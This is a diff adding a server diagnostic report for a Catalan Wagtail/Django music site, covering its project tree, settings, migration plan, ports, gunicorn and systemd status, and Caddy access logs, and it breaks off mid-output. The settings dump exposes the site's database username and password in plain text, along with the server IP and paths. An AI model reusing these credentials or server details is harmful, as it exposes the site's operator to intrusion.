@@ -1,0 +1,2787 @@
+==== 📂 ESTRUCTURA (resum) ====
+.
+├── .env
+├── home
+│   ├── blocks.py
+│   ├── forms.py
+│   ├── __init__.py
+│   ├── migrations
+│   │   ├── 0001_initial.py
+│   │   ├── 0002_create_homepage.py
+│   │   ├── 0003_cmsartista_homepage_body_homepage_intro.py
+│   │   ├── 0004_globalsettings.py
+│   │   ├── 0005_sitebrandingsettings_delete_globalsettings.py
+│   │   ├── 0006_dissenydelweb_delete_sitebrandingsettings.py
+│   │   ├── 0007_remove_homepage_intro_alter_homepage_body_and_more.py
+│   │   ├── 0008_sqltable_alter_homepage_body.py
+│   │   ├── 0009_alter_homepage_body.py
+│   │   ├── 0010_alter_homepage_body.py
+│   │   ├── 0011_alter_homepage_body.py
+│   │   ├── 0012_alter_homepage_body.py
+│   │   ├── 0013_alter_homepage_body.py
+│   │   ├── 0014_rolerequest.py
+│   │   ├── 0015_pendingartist_userartistpermission.py
+│   │   ├── 0016_sitebranding.py
+│   │   ├── 0017_registrepage_alter_pendingartist_id_and_more.py
+│   │   ├── 0018_cmsalbum_cmssong_musicindexpage_and_more.py
+│   │   ├── 0019_alter_homepage_body.py
+│   │   ├── 0020_alter_homepage_body.py
+│   │   ├── 0021_sitebranding_on_brand.py
+│   │   ├── 0022_scrub_legacy_sqlcarousel_and_drop_sqltable.py
+│   │   ├── 0023_pendingartist_manage_status_and_more.py
+│   │   ├── 0024_remove_registrepage_page_ptr_and_more.py
+│   │   ├── 0025_delete_rolerequest.py
+│   │   ├── 0026_delete_userartistpermission.py
+│   │   ├── 0027_alter_pendingartist_id_spotify_and_more.py
+│   │   ├── 0028_rename_sitebranding_to_sitedesign.py
+│   │   ├── 0029_sitedesign_base_font_size_px_and_more.py
+│   │   ├── 0030_alter_sitedesign_base_font_size_px_and_more.py
+│   │   ├── 0031_remove_sitedesign_link_remove_sitedesign_on_brand.py
+│   │   ├── 0032_remove_sitedesign_footer_bg_and_more.py
+│   │   ├── 0033_albumspage_artistspage_songspage.py
+│   │   ├── 0034_homepage_hero_cta_text_homepage_hero_cta_url_and_more.py
+│   │   ├── 0035_sitedesign_show_site_name_mainmenu_menuitem_and_more.py
+│   │   └── __init__.py
+│   ├── models.py
+│   ├── templates
+│   │   ├── blocks
+│   │   └── home
+│   ├── templatetags
+│   │   ├── __init__.py
+│   │   └── navigation_tags.py
+│   └── wagtail_hooks.py
+├── manage.py
+├── media
+│   ├── avatar_images
+│   │   └── avatar_9c6e7b9e-6b53-4f7c-8a4d-917748b03745_LogoCompletAmbFons.png
+│   ├── images
+│   │   ├── Icon.max-165x165.png
+│   │   ├── Icon.max-16x16.png
+│   │   ├── Icon.max-180x180.png
+│   │   ├── Icon.max-32x32.png
+│   │   ├── logo-admin.max-165x165.png
+│   │   ├── logo-admin.max-320x120.png
+│   │   ├── Lucid_Realism_a_cinematic_photo_o_28Czr3Z.2e16d0ba.fill-1200x400.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_o.2e16d0ba.fill-1200x400.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_o_70RT6UO.2e16d0ba.fill-1200x400.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_o_CbAGKa8.2e16d0ba.fill-1200x400.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_of_panoramic_0iBZrtO.max-165x165.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_of_panoramic_1vVVGXC.max-165x165.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_of_panoramic_2qcoZDf.max-165x165.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_of_panoramic_he.original.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_of_panoramic.max-165x165.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_of_panoramic.max-800x600.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_of_panoramic_TQmij38.max-165x165.jpg
+│   │   ├── Lucid_Realism_a_cinematic_photo_o_gJ3j6pp.2e16d0ba.fill-1200x400.jpg
+│   │   ├── TQicon.2e16d0ba.fill-200x60.png
+│   │   ├── TQicon.height-40.png
+│   │   ├── TQicon.max-165x165.png
+│   │   ├── TQicon.max-16x16.png
+│   │   ├── TQicon.max-180x180.png
+│   │   ├── TQicon.max-320x120.png
+│   │   ├── TQicon.max-32x32.png
+│   │   ├── TQicon.max-400x200.png
+│   │   ├── TQicon.max-800x600.png
+│   │   ├── TQicon.width-400.png
+│   │   ├── TQLogo_A5kLIx7.max-165x165.png
+│   │   ├── TQLogo_c85uwHn.max-320x120.png
+│   │   ├── TQLogo.height-40.png
+│   │   ├── TQLogo.max-165x165.png
+│   │   ├── TQLogo.max-320x120.png
+│   │   ├── TQLogo.max-400x200.png
+│   │   └── TQLogo.max-800x240.png
+│   └── original_images
+│       ├── Icon.png
+│       ├── logo-admin.png
+│       ├── Lucid_Realism_a_cinematic_photo_of_panoramic_hero_banner_31_co_0.jpg
+│       ├── Lucid_Realism_a_cinematic_photo_of_panoramic_hero_banner_31_co_1.jpg
+│       ├── Lucid_Realism_a_cinematic_photo_of_panoramic_hero_banner_31_co_2.jpg
+│       ├── Lucid_Realism_a_cinematic_photo_of_panoramic_hero_banner_31_co_3_1.jpg
+│       ├── Lucid_Realism_a_cinematic_photo_of_panoramic_hero_banner_31_ra_0.jpg
+│       ├── TQicon.png
+│       ├── TQLogo.png
+│       └── TQLogo.webp
+├── requirements.txt
+├── _snapshots
+│   └── css_templates_20250920_092013.tar.gz
+└── tqcms
+    ├── __init__.py
+    ├── settings
+    │   ├── base.py
+    │   ├── dev.py
+    │   ├── __init__.py
+    │   └── production.py
+    ├── static
+    │   ├── css
+    │   ├── img
+    │   └── js
+    ├── templates
+    │   ├── 404.html
+    │   ├── 500.html
+    │   ├── account
+    │   ├── base.html
+    │   ├── robots.txt
+    │   └── wagtailadmin
+    ├── urls.py
+    └── wsgi.py
+
+20 directories, 104 files
+
+==== 🗂️ .ENV (claus sanejades) ====
+
+==== ⚙️ SETTINGS CLAU (diffsettings) ====
+ALLOWED_HOSTS = ['www.topquaranta.cat', 'topquaranta.cat', 'localhost', '127.0.0.1']
+CSRF_COOKIE_SECURE = True
+CSRF_TRUSTED_ORIGINS = ['https://www.topquaranta.cat', 'https://topquaranta.cat']
+DATABASES = {'default': {'ENGINE': 'django.db.backends.postgresql', 'HOST': 'localhost', 'PORT': '5432', 'NAME': 'topqua\
+ranta', 'USER': 'topquaranta', 'PASSWORD': 'topquaranta', 'ATOMIC_REQUESTS': False, 'AUTOCOMMIT': True, 'CONN_MAX_AGE': \
+0, 'CONN_HEALTH_CHECKS': False, 'OPTIONS': {}, 'TIME_ZONE': None, 'TEST': {'CHARSET': None, 'COLLATION': None, 'MIGRATE'\
+: True, 'MIRROR': None, 'NAME': None}}}
+INSTALLED_APPS = ['home', 'wagtail.contrib.forms', 'wagtail.contrib.redirects', 'wagtail.embeds', 'wagtail.sites', 'wagt\
+ail.users', 'wagtail.snippets', 'wagtail.documents', 'wagtail.images', 'wagtail.search', 'wagtail.admin', 'wagtail', 'mo\
+delcluster', 'taggit', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.ses\
+sions', 'django.contrib.messages', 'django.contrib.staticfiles', 'wagtail.contrib.settings', 'django.contrib.sites', 'al\
+lauth', 'allauth.account', 'allauth.socialaccount', 'allauth.socialaccount.providers.google', 'allauth.socialaccount.pro\
+viders.instagram', 'allauth.socialaccount.providers.spotify']
+MEDIA_ROOT = '/root/TopQuaranta_Local/web_cms/media'
+MEDIA_URL = '/media/'
+MIDDLEWARE = ['django.middleware.security.SecurityMiddleware', 'whitenoise.middleware.WhiteNoiseMiddleware', 'django.con\
+trib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfVi\
+ewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMid\
+dleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'allauth.account.middleware.AccountMiddleware', 'wag\
+tail.contrib.redirects.middleware.RedirectMiddleware']
+ROOT_URLCONF = 'tqcms.urls'  ###
+SECURE_HSTS_INCLUDE_SUBDOMAINS = True
+SECURE_HSTS_PRELOAD = True
+SECURE_HSTS_SECONDS = 31536000
+SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')
+SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'
+SECURE_SSL_REDIRECT = True
+SESSION_COOKIE_SECURE = True
+STATIC_ROOT = '/root/TopQuaranta_Local/web_cms/staticfiles'
+STATIC_URL = '/static/'
+TEMPLATES = [{'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': ['/root/TopQuaranta_Local/web_cms/tq\
+cms/templates'], 'APP_DIRS': True, 'OPTIONS': {'context_processors': ['django.template.context_processors.debug', 'djang\
+o.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_\
+processors.messages', 'wagtail.contrib.settings.context_processors.settings']}}]
+USE_X_FORWARDED_HOST = True
+WAGTAILADMIN_BASE_URL = 'https://www.topquaranta.cat'  ###
+WAGTAILDOCS_EXTENSIONS = ['csv', 'docx', 'key', 'odt', 'pdf', 'pptx', 'rtf', 'txt', 'xlsx', 'zip']  ###
+WAGTAILSEARCH_BACKENDS = {'default': {'BACKEND': 'wagtail.search.backends.database'}}  ###
+WAGTAIL_SITE_NAME = 'tqcms'  ###
+
+==== ✅ Django check --deploy ====
+System check identified no issues (1 silenced).
+
+==== 🔁 Migrations (plan) ====
+[X]  contenttypes.0001_initial
+[X]  auth.0001_initial
+[X]  account.0001_initial
+[X]  account.0002_email_max_length
+[X]  account.0003_alter_emailaddress_create_unique_verified_email
+[X]  account.0004_alter_emailaddress_drop_unique_email
+[X]  account.0005_emailaddress_idx_upper_email
+[X]  account.0006_emailaddress_lower
+[X]  account.0007_emailaddress_idx_email
+[X]  account.0008_emailaddress_unique_primary_email_fixup
+[X]  account.0009_emailaddress_unique_primary_email
+[X]  admin.0001_initial
+[X]  admin.0002_logentry_remove_auto_add
+[X]  admin.0003_logentry_add_action_flag_choices
+[X]  contenttypes.0002_remove_content_type_name
+[X]  auth.0002_alter_permission_name_max_length
+[X]  auth.0003_alter_user_email_max_length
+[X]  auth.0004_alter_user_username_opts
+[X]  auth.0005_alter_user_last_login_null
+[X]  auth.0006_require_contenttypes_0002
+[X]  auth.0007_alter_validators_add_error_messages
+[X]  auth.0008_alter_user_username_max_length
+[X]  auth.0009_alter_user_last_name_max_length
+[X]  auth.0010_alter_group_name_max_length
+[X]  auth.0011_update_proxy_permissions
+[X]  auth.0012_alter_user_first_name_max_length
+[X]  wagtailcore.0001_squashed_0016_change_page_url_path_to_text_field
+[X]  wagtailcore.0017_change_edit_page_permission_description
+[X]  wagtailcore.0018_pagerevision_submitted_for_moderation_index
+[X]  wagtailcore.0019_verbose_names_cleanup
+[X]  wagtailcore.0020_add_index_on_page_first_published_at
+[X]  wagtailcore.0021_capitalizeverbose
+[X]  wagtailcore.0022_add_site_name
+[X]  wagtailcore.0023_alter_page_revision_on_delete_behaviour
+[X]  wagtailcore.0024_collection
+[X]  wagtailcore.0025_collection_initial_data
+[X]  wagtailcore.0026_group_collection_permission
+[X]  wagtailcore.0027_fix_collection_path_collation
+[X]  wagtailcore.0024_alter_page_content_type_on_delete_behaviour
+[X]  wagtailcore.0028_merge
+[X]  wagtailcore.0029_unicode_slugfield_dj19
+[X]  wagtailcore.0030_index_on_pagerevision_created_at
+[X]  wagtailcore.0031_add_page_view_restriction_types
+[X]  wagtailcore.0032_add_bulk_delete_page_permission
+[X]  wagtailcore.0033_remove_golive_expiry_help_text
+[X]  wagtailcore.0034_page_live_revision
+[X]  wagtailcore.0035_page_last_published_at
+[X]  wagtailcore.0036_populate_page_last_published_at
+[X]  wagtailcore.0037_set_page_owner_editable
+[X]  wagtailcore.0038_make_first_published_at_editable
+[X]  wagtailcore.0039_collectionviewrestriction
+[X]  wagtailcore.0040_page_draft_title
+[X]  wagtailcore.0041_group_collection_permissions_verbose_name_plural
+[X]  wagtailcore.0042_index_on_pagerevision_approved_go_live_at
+[X]  wagtailcore.0043_lock_fields
+[X]  wagtailcore.0044_add_unlock_grouppagepermission
+[X]  wagtailcore.0045_assign_unlock_grouppagepermission
+[X]  wagtailcore.0046_site_name_remove_null
+[X]  wagtailcore.0047_add_workflow_models
+[X]  wagtailcore.0048_add_default_workflows
+[X]  wagtailcore.0049_taskstate_finished_by
+[X]  wagtailcore.0050_workflow_rejected_to_needs_changes
+[X]  wagtailcore.0051_taskstate_comment
+[X]  wagtailcore.0052_pagelogentry
+[X]  home.0001_initial
+[X]  home.0002_create_homepage
+[X]  wagtailcore.0053_locale_model
+[X]  wagtailcore.0054_initial_locale
+[X]  wagtailcore.0055_page_locale_fields
+[X]  wagtailcore.0056_page_locale_fields_populate
+[X]  wagtailcore.0057_page_locale_fields_notnull
+[X]  wagtailcore.0058_page_alias_of
+[X]  wagtailcore.0059_apply_collection_ordering
+[X]  wagtailcore.0060_fix_workflow_unique_constraint
+[X]  wagtailcore.0061_change_promote_tab_helpt_text_and_verbose_names
+[X]  wagtailcore.0062_comment_models_and_pagesubscription
+[X]  wagtailcore.0063_modellogentry
+[X]  wagtailcore.0064_log_timestamp_indexes
+[X]  wagtailcore.0065_log_entry_uuid
+[X]  wagtailcore.0066_collection_management_permissions
+[X]  wagtailcore.0067_alter_pagerevision_content_json
+[X]  wagtailcore.0068_log_entry_empty_object
+[X]  wagtailcore.0069_log_entry_jsonfield
+[X]  wagtailcore.0070_rename_pagerevision_revision
+[X]  wagtailcore.0071_populate_revision_content_type
+[X]  wagtailcore.0072_alter_revision_content_type_notnull
+[X]  wagtailcore.0073_page_latest_revision
+[X]  wagtailcore.0074_revision_object_str
+[X]  wagtailcore.0075_populate_latest_revision_and_revision_object_str
+[X]  wagtailcore.0076_modellogentry_revision
+[X]  wagtailcore.0077_alter_revision_user
+[X]  wagtailcore.0078_referenceindex
+[X]  wagtailcore.0079_rename_taskstate_page_revision
+[X]  wagtailcore.0080_generic_workflowstate
+[X]  wagtailcore.0081_populate_workflowstate_content_type
+[X]  wagtailcore.0082_alter_workflowstate_content_type_notnull
+[X]  wagtailcore.0083_workflowcontenttype
+[X]  wagtailcore.0084_add_default_page_permissions
+[X]  wagtailcore.0085_add_grouppagepermission_permission
+[X]  wagtailcore.0086_populate_grouppagepermission_permission
+[X]  wagtailcore.0087_alter_grouppagepermission_unique_together_and_more
+[X]  wagtailcore.0088_fix_log_entry_json_timestamps
+[X]  wagtailcore.0089_log_entry_data_json_null_to_object
+[X]  wagtailcore.0090_remove_grouppagepermission_permission_type
+[X]  wagtailcore.0091_remove_revision_submitted_for_moderation
+[X]  wagtailcore.0092_alter_collectionviewrestriction_password_and_more
+[X]  wagtailcore.0093_uploadedfile
+[X]  wagtailcore.0094_alter_page_locale
+[X]  taggit.0001_initial
+[X]  wagtailimages.0001_squashed_0021
+[X]  wagtailimages.0022_uploadedimage
+[X]  wagtailadmin.0001_create_admin_access_permissions
+[X]  wagtailimages.0023_add_choose_permissions
+[X]  wagtailimages.0024_index_image_file_hash
+[X]  wagtailimages.0025_alter_image_file_alter_rendition_file
+[X]  wagtailimages.0026_delete_uploadedimage
+[X]  wagtailimages.0027_image_description
+[X]  home.0003_cmsartista_homepage_body_homepage_intro
+[X]  home.0004_globalsettings
+[X]  home.0005_sitebrandingsettings_delete_globalsettings
+[X]  home.0006_dissenydelweb_delete_sitebrandingsettings
+[X]  home.0007_remove_homepage_intro_alter_homepage_body_and_more
+[X]  home.0008_sqltable_alter_homepage_body
+[X]  home.0009_alter_homepage_body
+[X]  home.0010_alter_homepage_body
+[X]  home.0011_alter_homepage_body
+[X]  home.0012_alter_homepage_body
+[X]  home.0013_alter_homepage_body
+[X]  home.0014_rolerequest
+[X]  home.0015_pendingartist_userartistpermission
+[X]  home.0016_sitebranding
+[X]  home.0017_registrepage_alter_pendingartist_id_and_more
+[X]  home.0018_cmsalbum_cmssong_musicindexpage_and_more
+[X]  home.0019_alter_homepage_body
+[X]  home.0020_alter_homepage_body
+[X]  home.0021_sitebranding_on_brand
+[X]  home.0022_scrub_legacy_sqlcarousel_and_drop_sqltable
+[X]  home.0023_pendingartist_manage_status_and_more
+[X]  home.0024_remove_registrepage_page_ptr_and_more
+[X]  home.0025_delete_rolerequest
+[X]  home.0026_delete_userartistpermission
+[X]  home.0027_alter_pendingartist_id_spotify_and_more
+[X]  home.0028_rename_sitebranding_to_sitedesign
+[X]  home.0029_sitedesign_base_font_size_px_and_more
+[X]  home.0030_alter_sitedesign_base_font_size_px_and_more
+[X]  home.0031_remove_sitedesign_link_remove_sitedesign_on_brand
+[X]  home.0032_remove_sitedesign_footer_bg_and_more
+[X]  home.0033_albumspage_artistspage_songspage
+[X]  home.0034_homepage_hero_cta_text_homepage_hero_cta_url_and_more
+[X]  home.0035_sitedesign_show_site_name_mainmenu_menuitem_and_more
+[X]  sessions.0001_initial
+[X]  sites.0001_initial
+[X]  sites.0002_alter_domain_unique
+[X]  socialaccount.0001_initial
+[X]  socialaccount.0002_token_max_lengths
+[X]  socialaccount.0003_extra_data_default_dict
+[X]  socialaccount.0004_app_provider_id_settings
+[X]  socialaccount.0005_socialtoken_nullable_app
+[X]  socialaccount.0006_alter_socialaccount_extra_data
+[X]  taggit.0002_auto_20150616_2121
+[X]  taggit.0003_taggeditem_add_unique_index
+[X]  taggit.0004_alter_taggeditem_content_type_alter_taggeditem_tag
+[X]  taggit.0005_auto_20220424_2025
+[X]  taggit.0006_rename_taggeditem_content_type_object_id_taggit_tagg_content_8fc721_idx
+[X]  wagtailadmin.0002_admin
+[X]  wagtailadmin.0003_admin_managed
+[X]  wagtailadmin.0004_editingsession
+[X]  wagtailadmin.0005_editingsession_is_editing
+[X]  wagtaildocs.0001_initial
+[X]  wagtaildocs.0002_initial_data
+[X]  wagtaildocs.0003_add_verbose_names
+[X]  wagtaildocs.0004_capitalizeverbose
+[X]  wagtaildocs.0005_document_collection
+[X]  wagtaildocs.0006_copy_document_permissions_to_collections
+[X]  wagtaildocs.0005_alter_uploaded_by_user_on_delete_action
+[X]  wagtaildocs.0007_merge
+[X]  wagtaildocs.0008_document_file_size
+[X]  wagtaildocs.0009_document_verbose_name_plural
+[X]  wagtaildocs.0010_document_file_hash
+[X]  wagtaildocs.0011_add_choose_permissions
+[X]  wagtaildocs.0012_uploadeddocument
+[X]  wagtaildocs.0013_delete_uploadeddocument
+[X]  wagtaildocs.0014_alter_document_file_size
+[X]  wagtailembeds.0001_initial
+[X]  wagtailembeds.0002_add_verbose_names
+[X]  wagtailembeds.0003_capitalizeverbose
+[X]  wagtailembeds.0004_embed_verbose_name_plural
+[X]  wagtailembeds.0005_specify_thumbnail_url_max_length
+[X]  wagtailembeds.0006_add_embed_hash
+[X]  wagtailembeds.0007_populate_hash
+[X]  wagtailembeds.0008_allow_long_urls
+[X]  wagtailembeds.0009_embed_cache_until
+[X]  wagtailforms.0001_initial
+[X]  wagtailforms.0002_add_verbose_names
+[X]  wagtailforms.0003_capitalizeverbose
+[X]  wagtailforms.0004_add_verbose_name_plural
+[X]  wagtailforms.0005_alter_formsubmission_form_data
+[X]  wagtailredirects.0001_initial
+[X]  wagtailredirects.0002_add_verbose_names
+[X]  wagtailredirects.0003_make_site_field_editable
+[X]  wagtailredirects.0004_set_unique_on_path_and_site
+[X]  wagtailredirects.0005_capitalizeverbose
+[X]  wagtailredirects.0006_redirect_increase_max_length
+[X]  wagtailredirects.0007_add_autocreate_fields
+[X]  wagtailredirects.0008_add_verbose_name_plural
+[X]  wagtailsearch.0001_initial
+[X]  wagtailsearch.0002_add_verbose_names
+[X]  wagtailsearch.0003_remove_editors_pick
+[X]  wagtailsearch.0004_querydailyhits_verbose_name_plural
+[X]  wagtailsearch.0005_create_indexentry
+[X]  wagtailsearch.0006_customise_indexentry
+[X]  wagtailsearch.0007_delete_editorspick
+[X]  wagtailsearch.0008_remove_query_and_querydailyhits_models
+[X]  wagtailsearch.0009_remove_ngram_autocomplete
+[X]  wagtailusers.0001_initial
+[X]  wagtailusers.0002_add_verbose_name_on_userprofile
+[X]  wagtailusers.0003_add_verbose_names
+[X]  wagtailusers.0004_capitalizeverbose
+[X]  wagtailusers.0005_make_related_name_wagtail_specific
+[X]  wagtailusers.0006_userprofile_prefered_language
+[X]  wagtailusers.0007_userprofile_current_time_zone
+[X]  wagtailusers.0008_userprofile_avatar
+[X]  wagtailusers.0009_userprofile_verbose_name_plural
+[X]  wagtailusers.0010_userprofile_updated_comments_notifications
+[X]  wagtailusers.0011_userprofile_dismissibles
+[X]  wagtailusers.0012_userprofile_theme
+[X]  wagtailusers.0013_userprofile_density
+[X]  wagtailusers.0014_userprofile_contrast
+
+==== 🌐 Ports i processos web ====
+tcp   LISTEN 0      2048            127.0.0.1:8081       0.0.0.0:*    users:(("gunicorn",pid=3301234,fd=5),("gunicorn",p\
+id=3301233,fd=5),("gunicorn",pid=3301232,fd=5),("gunicorn",pid=3301230,fd=5))
+tcp   LISTEN 0      4096                    *:80               *:*    users:(("caddy",pid=2211644,fd=16))               \
+                                                                             
+tcp   LISTEN 0      4096                    *:443              *:*    users:(("caddy",pid=2211644,fd=10))               \
+                                                                             
+
+→ gunicorn PIDs i comandament:
+    PID CMD
+3301230 /root/TopQuaranta_Local/venv/bin/python3 /root/TopQuaranta_Local/venv/bin/gunicorn tqcms.wsgi:application --bind\
+ 127.0.0.1:8081 --workers 3 --timeout 120
+3301232 /root/TopQuaranta_Local/venv/bin/python3 /root/TopQuaranta_Local/venv/bin/gunicorn tqcms.wsgi:application --bind\
+ 127.0.0.1:8081 --workers 3 --timeout 120
+3301233 /root/TopQuaranta_Local/venv/bin/python3 /root/TopQuaranta_Local/venv/bin/gunicorn tqcms.wsgi:application --bind\
+ 127.0.0.1:8081 --workers 3 --timeout 120
+3301234 /root/TopQuaranta_Local/venv/bin/python3 /root/TopQuaranta_Local/venv/bin/gunicorn tqcms.wsgi:application --bind\
+ 127.0.0.1:8081 --workers 3 --timeout 120
+
+==== 🧩 Systemd units (caddy/django) ====
+● caddy.service - Caddy
+     Loaded: loaded (/lib/systemd/system/caddy.service; enabled; vendor preset: enabled)
+     Active: active (running) since Wed 2025-09-03 22:21:40 UTC; 1 month 4 days ago
+       Docs: https://caddyserver.com/docs/
+   Main PID: 2211644 (caddy)
+      Tasks: 10 (limit: 4532)
+     Memory: 26.9M
+        CPU: 16min 37.634s
+     CGroup: /system.slice/caddy.service
+             └─2211644 /usr/bin/caddy run --environ --config /etc/caddy/Caddyfile
+
+Oct 08 18:46:31 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949191.0738785,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"207.90.244.28","remote_port":"56582","client_ip":"207.90.244.28","proto":"\
+HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/robots.txt","headers":{"Accept-Encoding":["identity"]}},"bytes_r\
+ead":0,"user_id":"","duration":0.000030414,"size":0,"status":308,"resp_headers":{"Content-Type":[],"Server":["Caddy"],"C\
+onnection":["close"],"Location":["https://188.245.60.20/robots.txt"]}}
+Oct 08 18:46:32 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949192.497881,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"207.90.244.28","remote_port":"56584","client_ip":"207.90.244.28","proto":"H\
+TTP/1.1","method":"GET","host":"188.245.60.20","uri":"/sitemap.xml","headers":{"Accept-Encoding":["identity"]}},"bytes_r\
+ead":0,"user_id":"","duration":0.000038488,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close\
+"],"Location":["https://188.245.60.20/sitemap.xml"],"Content-Type":[]}}
+Oct 08 18:46:33 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949193.4197965,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"207.90.244.28","remote_port":"56596","client_ip":"207.90.244.28","proto":"\
+HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/.well-known/security.txt","headers":{"Accept-Encoding":["identit\
+y"]}},"bytes_read":0,"user_id":"","duration":0.000020466,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Conne\
+ction":["close"],"Location":["https://188.245.60.20/.well-known/security.txt"],"Content-Type":[]}}
+Oct 08 18:46:36 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949196.0252402,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"207.90.244.28","remote_port":"47838","client_ip":"207.90.244.28","proto":"\
+HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/favicon.ico","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 1\
+0.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"],"Connection":["keep-alive"]\
+,"Accept-Encoding":["gzip, deflate"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000191544,"size":0,"sta\
+tus":308,"resp_headers":{"Content-Type":[],"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/\
+favicon.ico"]}}
+Oct 08 18:48:46 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949326.7286246,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"145.90.8.11","remote_port":"48952","client_ip":"145.90.8.11","proto":"HTTP\
+/1.1","method":"HEAD","host":"188.245.60.20:80","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64;\
+ x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"]}},"bytes_read":0,"user_id":"","durati\
+on":0.000098515,"size":0,"status":308,"resp_headers":{"Location":["https://188.245.60.20/"],"Content-Type":[],"Server":[\
+"Caddy"],"Connection":["close"]}}
+Oct 08 19:00:14 topquaranta-server caddy[2211644]: {"level":"info","ts":1759950014.738544,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"176.65.132.111","remote_port":"37404","client_ip":"176.65.132.111","proto":\
+"HTTP/1.1","method":"GET","host":"one-api.ir","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x\
+64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"]}},"bytes_read":0,"user_id":"","duration":0.0\
+00322894,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://one-api.ir\
+/"],"Content-Type":[]}}
+Oct 08 19:40:26 topquaranta-server caddy[2211644]: {"level":"info","ts":1759952426.5127764,"logger":"tls","msg":"cleanin\
+g storage unit","storage":"FileStorage:/var/lib/caddy/.local/share/caddy"}
+Oct 08 19:40:26 topquaranta-server caddy[2211644]: {"level":"info","ts":1759952426.517875,"logger":"tls","msg":"finished\
+ cleaning storage units"}
+Oct 08 19:40:43 topquaranta-server caddy[2211644]: {"level":"info","ts":1759952443.4892101,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"204.76.203.212","remote_port":"52194","client_ip":"204.76.203.212","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"Accept-Encoding":["gzip, deflate","gzip, defl\
+ate"],"Accept":["*/*"],"X-Requested-With":["XMLHttpRequest"],"Content-Type":["application/x-www-form-urlencoded; charset\
+=UTF-8"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb\
+Kit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"],"Connection":["keep-alive"]}},"bytes_\
+read":0,"user_id":"","duration":0.00005777,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close\
+"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 20:25:42 topquaranta-server caddy[2211644]: {"level":"info","ts":1759955142.198244,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"204.76.203.219","remote_port":"35388","client_ip":"204.76.203.219","proto":\
+"HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Wi\
+n64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"],"Accept":["*/*"],"C\
+onnection":["keep-alive"],"Content-Type":["application/x-www-form-urlencoded; charset=UTF-8"],"Accept-Encoding":["gzip, \
+deflate","gzip, deflate"],"X-Requested-With":["XMLHttpRequest"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8"]}},"bytes_r\
+ead":0,"user_id":"","duration":0.000101989,"size":0,"status":308,"resp_headers":{"Location":["https://188.245.60.20/"],"\
+Content-Type":[],"Server":["Caddy"],"Connection":["close"]}}
+
+---- systemctl status topquaranta_web.service ----
+● topquaranta_web.service - TopQuaranta - Wagtail (Django) public site
+     Loaded: loaded (/etc/systemd/system/topquaranta_web.service; enabled; vendor preset: enabled)
+     Active: active (running) since Wed 2025-10-08 20:57:00 UTC; 5min ago
+   Main PID: 3301230 (gunicorn)
+      Tasks: 4 (limit: 4532)
+     Memory: 233.4M
+        CPU: 7.772s
+     CGroup: /system.slice/topquaranta_web.service
+             ├─3301230 /root/TopQuaranta_Local/venv/bin/python3 /root/TopQuaranta_Local/venv/bin/gunicorn tqcms.wsgi:app\
+lication --bind 127.0.0.1:8081 --workers 3 --timeout 120
+             ├─3301232 /root/TopQuaranta_Local/venv/bin/python3 /root/TopQuaranta_Local/venv/bin/gunicorn tqcms.wsgi:app\
